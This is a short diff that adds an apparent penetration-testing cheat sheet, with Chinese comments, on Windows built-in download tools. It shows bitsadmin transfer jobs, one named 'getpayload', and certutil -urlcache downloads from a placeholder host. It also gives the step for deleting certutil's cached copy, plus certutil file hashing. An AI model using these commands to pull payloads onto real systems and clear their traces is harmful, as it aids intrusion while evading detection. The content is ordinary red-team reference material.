@@ -1,0 +1,15 @@
+
+bitsadmin /rawreturn /transfer getfile http://url/demo.txt c:\demo.txt
+bitsadmin /rawreturn /transfer getpayload http://url/demo.jpg c:\demo.jpg
+bitsadmin /transfer mJob /download "http://url/demo.mp3" "c:\demo.mp3"
+ 
+查看缓存项目:
+certutil.exe -urlcache *
+certutil.exe -urlcache -split -f https://url/oops.mp3 oops.mp3
+清除下载文件副本方法:
+certutil.exe -urlcache -split -f https://url/oops.mp3 delete
+ 
+certutil.exe -hashfile audio.zip    //计算文件sha1
+certutil.exe -hashfile img.zip MD5  //计算文件md5
+ 
+ 
